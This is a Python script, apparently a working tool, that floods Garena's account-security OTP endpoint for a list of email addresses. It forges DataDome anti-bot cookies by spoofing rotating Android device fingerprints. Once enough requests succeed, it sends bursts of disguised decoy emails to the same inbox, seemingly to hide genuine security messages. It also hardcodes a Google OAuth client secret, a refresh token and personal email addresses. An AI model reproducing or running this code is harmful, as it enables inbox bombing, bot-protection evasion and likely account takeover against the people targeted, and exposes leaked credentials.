
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Garena OTP Ultra Smart Sender - Multi Slot Edition
8 Emails | Parallel | Smart Device Rotation
"""

import requests
import json
import time
import os
import sys
import random
import base64
from datetime import datetime
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ============================================================
#                    CONFIGURATION
# ============================================================

# ✏️  حط هنا الإيميلات ديالك - كل واحد في سطر
SLOTS = [
    "douaakamal18@gmail.com",       # Slot 1
    "ttf73611@gmail.com",       # Slot 2
    "gzshdjcjzidk@gmail.com",       # Slot 3
    "me3seeee10@gmail.com",       # Slot 4
    "mohamedelaroussi92@gmail.com",       # Slot 5
    "email6@gmail.com",       # Slot 6
    "email7@gmail.com",       # Slot 7
    "email8@gmail.com",       # Slot 8
]

REQUESTS_PER_BATCH = 15       # عدد الطلبات لكل إيميل في كل دفعة
INTERVAL = 1                  # ثانية بين الدفعات
MAX_WORKERS = 15              # threads لكل slot
DEVICE_ROTATE_MINUTES = 5    # تغيير معلومات الجهاز كل X دقيقة

# Google OAuth2 (للإيميلات عند النجاح)
GOOGLE_CLIENT_ID = '918169071446-7h13usae4sfdo5ksqhg9bl69plq8rh7o.apps.googleusercontent.com'
GOOGLE_CLIENT_SECRET = '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'
REFRESH_TOKEN = '1//03IpojIjwmLEtCgYIARAAGAMSNwF-L9IrMMgZsLxtPbPt8sKU_hw1nm3sW2hYECHNhbgNq-q1V1E9U_RvXlM2JOs9Zv4Wsv9Y80Y'

SUCCESS_THRESHOLD = 3
EMAILS_TO_SEND = 25

# ============================================================


class Colors:
    BLUE    = '\033[94m'
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    MAGENTA = '\033[95m'
    BOLD    = '\033[1m'
    RESET   = '\033[0m'


print_lock = threading.Lock()


# ============================================================
# Device Pool - يتغير كل DEVICE_ROTATE_MINUTES دقيقة
# ============================================================

DEVICE_MODELS = [
    {"mdl": "Redmi Note 8 Pro",  "prd": "begonia",    "dev": "begonia",    "hrd": "mt6785",
     "fgp": "Redmi/begonia/begonia:11/RP1A.200720.011/V12.5.8.0.RGGMIXM:user/release-keys",
     "sdk": "GarenaMSDK/4.0.39(Redmi Note 8 Pro ;Android 11;en;US;)"},
    {"mdl": "Samsung Galaxy A52", "prd": "a52xq",     "dev": "a52xq",      "hrd": "sm7325",
     "fgp": "samsung/a52xq/a52xq:11/RP1A.200720.012/A526B:user/release-keys",
     "sdk": "GarenaMSDK/4.0.39(Samsung Galaxy A52 ;Android 11;en;US;)"},
    {"mdl": "OPPO A54",           "prd": "OP4BA2L1",  "dev": "OP4BA2L1",   "hrd": "mt6765",
     "fgp": "OPPO/OP4BA2L1/OP4BA2L1:11/RKQ1.200928.002/1624943576:user/release-keys",
     "sdk": "GarenaMSDK/4.0.39(OPPO A54 ;Android 11;en;US;)"},
    {"mdl": "Realme 8",           "prd": "RMX3085",   "dev": "RMX3085",    "hrd": "mt6785",
     "fgp": "realme/RMX3085/RMX3085:11/RP1A.200720.011/1623296735:user/release-keys",
     "sdk": "GarenaMSDK/4.0.39(Realme 8 ;Android 11;en;US;)"},
    {"mdl": "Vivo Y72",           "prd": "V2041",     "dev": "V2041",      "hrd": "mt6853",
     "fgp": "vivo/V2041/V2041:11/RP1A.200720.012/compile-eng 11:user/release-keys",
     "sdk": "GarenaMSDK/4.0.39(Vivo Y72 ;Android 11;en;US;)"},
    {"mdl": "Xiaomi Redmi 9",     "prd": "lancelot",  "dev": "lancelot",   "hrd": "mt6769",
     "fgp": "Redmi/lancelot/lancelot:10/QKQ1.200628.002/V12.0.3.0.QJCMIXM:user/release-keys",
     "sdk": "GarenaMSDK/4.0.39(Xiaomi Redmi 9 ;Android 10;en;US;)"},
    {"mdl": "Huawei Y9s",         "prd": "STK-L22",   "dev": "HWSTK-Q",    "hrd": "kirin710",
     "fgp": "HUAWEI/STK-L22/HWSTK-Q:10/HUAWEISTK-L22/10.0.0.197C431:user/release-keys",
     "sdk": "GarenaMSDK/4.0.39(Huawei Y9s ;Android 10;en;US;)"},
    {"mdl": "Nokia 5.4",          "prd": "ddt_sprout", "dev": "ddt",       "hrd": "sm4350",
     "fgp": "Nokia/ddt_sprout/ddt:11/RP1A.200720.011/00WW_3_170:user/release-keys",
     "sdk": "GarenaMSDK/4.0.39(Nokia 5.4 ;Android 11;en;US;)"},
]

# كل slot عنده device خاص بيه كيتغير كل 5 دقائق
_slot_devices = {}
_slot_device_time = {}
_slot_lock = threading.Lock()


def get_device_for_slot(slot_index):
    """إرجاع device لكل slot مع التغيير التلقائي كل 5 دقائق"""
    with _slot_lock:
        now = time.time()
        last_change = _slot_device_time.get(slot_index, 0)
        
        if now - last_change > (DEVICE_ROTATE_MINUTES * 60):
            device = random.choice(DEVICE_MODELS)
            _slot_devices[slot_index] = device
            _slot_device_time[slot_index] = now
        
        return _slot_devices.get(slot_index, DEVICE_MODELS[slot_index % len(DEVICE_MODELS)])


# ============================================================


ARABIC_NAMES = [
    "Ahmed Salm", "Nora Bojad", "Temo Raba", "Sara Khalil", "Omar Mansour",
    "Layla Hassan", "Karim Abdel", "Fatima Zahra", "Youssef Amin", "Hanan Saeed",
    "Rami Fouad", "Mona Bakri", "Tariq Nazir", "Amina Faris", "Bilal Rashid",
]

EMAIL_SUBJECTS = [
    "Quick follow-up on our discussion", "Update regarding your request",
    "Important notice - please review", "Confirmation needed for next steps",
    "Action required - deadline approaching", "Status update on ongoing tasks",
]

EMAIL_TEMPLATES = [
    "Hello,\n\nI hope this message finds you well. I wanted to reach out regarding some recent developments.\n\nLooking forward to your response.\n\nBest regards,\n{name}",
    "Hi,\n\nThank you for your continued support. I'm writing to provide you with an update.\n\nWarm regards,\n{name}",
    "Dear colleague,\n\nI hope you're doing well. I'm reaching out to follow up on our recent conversation.\n\nBest,\n{name}",
]


def safe_print(message, color=Colors.WHITE):
    with print_lock:
        print(color + message + Colors.RESET)


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_header(batch_count):
    print(Colors.CYAN + Colors.BOLD + "=" * 70 + Colors.RESET)
    print(Colors.CYAN + Colors.BOLD + f"  ⚡ Ultra Smart OTP Sender  |  BATCH #{batch_count}  |  {len(SLOTS)} Slots Active ⚡" + Colors.RESET)
    print(Colors.CYAN + Colors.BOLD + "=" * 70 + Colors.RESET)
    print()


def get_access_token():
    url = "https://oauth2.googleapis.com/token"
    data = {
        'client_id': GOOGLE_CLIENT_ID,
        'client_secret': GOOGLE_CLIENT_SECRET,
        'refresh_token': REFRESH_TOKEN,
        'grant_type': 'refresh_token'
    }
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            return response.json().get('access_token')
    except:
        pass
    return None


def create_random_email():
    name = random.choice(ARABIC_NAMES)
    return {
        'from_name': name,
        'subject': random.choice(EMAIL_SUBJECTS),
        'body': random.choice(EMAIL_TEMPLATES).format(name=name)
    }


def send_gmail(to_email, subject, body, from_name, access_token):
    try:
        message = MIMEMultipart()
        message['To'] = to_email
        message['From'] = f'{from_name} <{to_email}>'
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))
        raw_message = base64.urlsafe_b64encode(message.as_bytes()).decode('utf-8')
        url = 'https://gmail.googleapis.com/gmail/v1/users/me/messages/send'
        headers = {'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'}
        response = requests.post(url, headers=headers, json={'raw': raw_message}, timeout=10)
        return response.status_code == 200
    except:
        return False


def send_email_burst(target_email, num_emails):
    access_token = get_access_token()
    if not access_token:
        return 0
    sent = 0
    def send_one(i):
        edata = create_random_email()
        return send_gmail(target_email, edata['subject'], edata['body'], edata['from_name'], access_token)
    with ThreadPoolExecutor(max_workers=10) as ex:
        results = list(ex.map(send_one, range(num_emails)))
        sent = sum(results)
    return sent


def get_datadome_cookie(target_url, device, retry=2):
    """الحصول على DataDome cookie مع device محدد"""
    url = "https://api-sdk.datadome.co/sdk/"
    
    for attempt in range(retry):
        try:
            timestamp = int(time.time() * 1000)
            events = [{"id": 1, "message": "response validation", "source": "sdk", "date": timestamp}]
            
            # أرقام شاشة عشوائية
            screen_x = random.choice(["1080", "1440", "1280"])
            screen_y = random.choice(["2340", "3120", "2960"])
            screen_d = random.choice(["480", "560", "640"])
            
            data = {
                "cid": "initial_request",
                "ddv": "1.13.9",
                "ddvc": "4.0.39",
                "ddk": "AE3F04AD3F0D3A462481A337485081",
                "request": target_url,
                "os": "Android",
                "osr": "11",
                "osn": "R",
                "osv": "30",
                "ua": device["sdk"],
                "screen_x": screen_x,
                "screen_y": screen_y,
                "screen_d": screen_d,
                "events": json.dumps(events),
                "camera": json.dumps({"auth": "false", "info": "{}"}),
                "mdl": device["mdl"],
                "prd": device["prd"],
                "mnf": device["mdl"].split()[0],
                "dev": device["dev"],
                "hrd": device["hrd"],
                "fgp": device["fgp"],
                "tgs": "release-keys",
                "inte": "android-java-okhttp"
            }
            
            headers = {
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            }
            
            response = requests.post(url, data=urlencode(data), headers=headers, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                if result.get("status") == 200 and "cookie" in result:
                    cookie_value = result["cookie"].split(";")[0].split("=")[1]
                    return cookie_value
            
            if attempt < retry - 1:
                time.sleep(0.5)
                
        except:
            if attempt < retry - 1:
                time.sleep(0.5)
    
    return None


def send_otp_single(email, request_num, device, app_id="100067", locale="en_MA"):
    """إرسال طلب OTP واحد"""
    target_url = f"https://{app_id}.connect.garena.com/game/account_security/swap:send_otp"
    start_time = time.time()
    
    cookie = get_datadome_cookie(target_url, device)
    
    if not cookie:
        return {"request_num": request_num, "success": False, "error": "Cookie failed", "duration": time.time() - start_time}
    
    data = {"app_id": app_id, "email": email, "locale": locale}
    
    headers = {
        "User-Agent": device["sdk"],
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": f"{app_id}.connect.garena.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Cookie": f"datadome={cookie}"
    }
    
    try:
        response = requests.post(target_url, data=urlencode(data), headers=headers, timeout=10)
        result = response.json()
        duration = time.time() - start_time
        
        if response.status_code == 200 and result.get("result") == 0:
            return {"request_num": request_num, "success": True, "duration": duration}
        else:
            error_code = result.get('code', result.get('msg', 'unknown'))
            return {"request_num": request_num, "success": False, "error": f"Error {error_code}", "duration": duration}
            
    except Exception as e:
        return {"request_num": request_num, "success": False, "error": "Timeout", "duration": time.time() - start_time}


def run_slot(slot_index, email, batch_count):
    """شغل slot واحد كامل - يرجع ملخص برسالة واحدة"""
    device = get_device_for_slot(slot_index)
    batch_start = time.time()
    
    successful = 0
    failed = 0
    last_error = ""
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(send_otp_single, email, i+1, device) for i in range(REQUESTS_PER_BATCH)]
        for future in as_completed(futures):
            result = future.result()
            if result["success"]:
                successful += 1
            else:
                failed += 1
                last_error = result.get("error", "unknown")
    
    total_time = time.time() - batch_start
    
    # بناء رسالة النتيجة - رسالة واحدة فقط
    slot_num = slot_index + 1
    
    if successful > 0:
        result_line = (
            f"{Colors.CYAN}{Colors.BOLD}{slot_num} : {email}{Colors.RESET}\n"
            f"  {Colors.GREEN}✅ #{REQUESTS_PER_BATCH} lump sum : Successful {successful}/{REQUESTS_PER_BATCH} | Failed {failed}/{REQUESTS_PER_BATCH} ({total_time:.1f}s){Colors.RESET}"
        )
    else:
        result_line = (
            f"{Colors.CYAN}{Colors.BOLD}{slot_num} : {email}{Colors.RESET}\n"
            f"  {Colors.RED}❌ #{REQUESTS_PER_BATCH} lump sum: {last_error} | Failed {failed}/{REQUESTS_PER_BATCH} ({total_time:.1f}s){Colors.RESET}"
        )
    
    with print_lock:
        print(result_line)
    
    # إرسال إيميلات إذا نجح
    if successful >= SUCCESS_THRESHOLD:
        with print_lock:
            print(f"  {Colors.YELLOW}{Colors.BOLD}🔥 TRIGGER! Sending {EMAILS_TO_SEND} emails...{Colors.RESET}")
        sent = send_email_burst(email, EMAILS_TO_SEND)
        with print_lock:
            print(f"  {Colors.MAGENTA}📨 Sent {sent}/{EMAILS_TO_SEND} emails{Colors.RESET}")
    
    return successful


def countdown_timer(seconds):
    try:
        for remaining in range(seconds, 0, -1):
            bar_length = 40
            filled = int((remaining / seconds) * bar_length)
            bar = "█" * filled + "░" * (bar_length - filled)
            sys.stdout.write('\r')
            sys.stdout.write(Colors.BLUE + Colors.BOLD + f"  ⏰ [{bar}] {remaining}s  " + Colors.RESET)
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write('\r' + ' ' * 70 + '\r')
        sys.stdout.flush()
    except KeyboardInterrupt:
        print()
        safe_print("⚠️  Stopped.", Colors.YELLOW)
        sys.exit(0)


def main():
    clear_screen()
    batch_count = 0
    
    # تحقق من الإيميلات
    active_slots = [e for e in SLOTS if not e.startswith("email") and "@" in e]
    if not active_slots:
        print(Colors.RED + "❌ لازم تحط إيميلات حقيقية في SLOTS!" + Colors.RESET)
        sys.exit(1)
    
    print(Colors.MAGENTA + Colors.BOLD + f"🚀 {len(active_slots)} slots active | {REQUESTS_PER_BATCH} req/slot | device rotate: {DEVICE_ROTATE_MINUTES}min" + Colors.RESET)
    print()
    
    while True:
        batch_count += 1
        clear_screen()
        print_header(batch_count)
        
        print(Colors.YELLOW + f"  ⚡ Launching all {len(active_slots)} slots simultaneously...\n" + Colors.RESET)
        
        # كل الـ slots تشتغل في نفس الوقت
        with ThreadPoolExecutor(max_workers=len(active_slots)) as executor:
            futures = {
                executor.submit(run_slot, idx, email, batch_count): (idx, email)
                for idx, email in enumerate(active_slots)
            }
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    idx, email = futures[future]
                    with print_lock:
                        print(f"{Colors.RED}Slot {idx+1} error: {e}{Colors.RESET}")
        
        print()
        print(Colors.CYAN + "=" * 70 + Colors.RESET)
        
        countdown_timer(INTERVAL)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        safe_print("👋 Stopped. Goodbye!", Colors.YELLOW)
        sys.exit(0)
    except Exception as e:
        safe_print(f"❌ Error: {str(e)}", Colors.RED)
        sys.exit(1)
